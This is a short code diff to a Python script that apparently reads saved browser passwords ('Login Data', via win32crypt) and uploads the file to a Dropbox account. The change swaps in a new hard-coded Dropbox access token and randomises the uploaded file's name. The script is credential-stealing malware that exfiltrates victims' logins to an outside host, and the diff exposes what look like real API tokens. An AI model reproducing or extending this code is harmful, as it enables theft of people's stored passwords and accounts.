@@ -3,6 +3,7 @@ import sqlite3
 import shutil
 import getpass
 import dropbox
+import random
 try:
     import win32crypt
 except:
@@ -57,9 +58,10 @@ def send():
 
     jsonData = getpasswords()
     #Get your access code form dropbox to use it here.
-    dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAAS0lJw_bxPINvoAZc2PN041CLRCJHOzm_0fQTy6F6RMiB')
+    dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAATLG-Uk8R8aC57_ydn4KZOAwXe2dOo7sQ3auJobdJRjlq')
     file_from="c:\prog\Login Data"
-    file_to="/kaunheh/Login Data"
+    x=random.randint(1,500)
+    file_to="/kaunheh/"+str(x)
     with open(file_from, 'rb') as f:
             dbx.files_upload(f.read(), file_to)
 
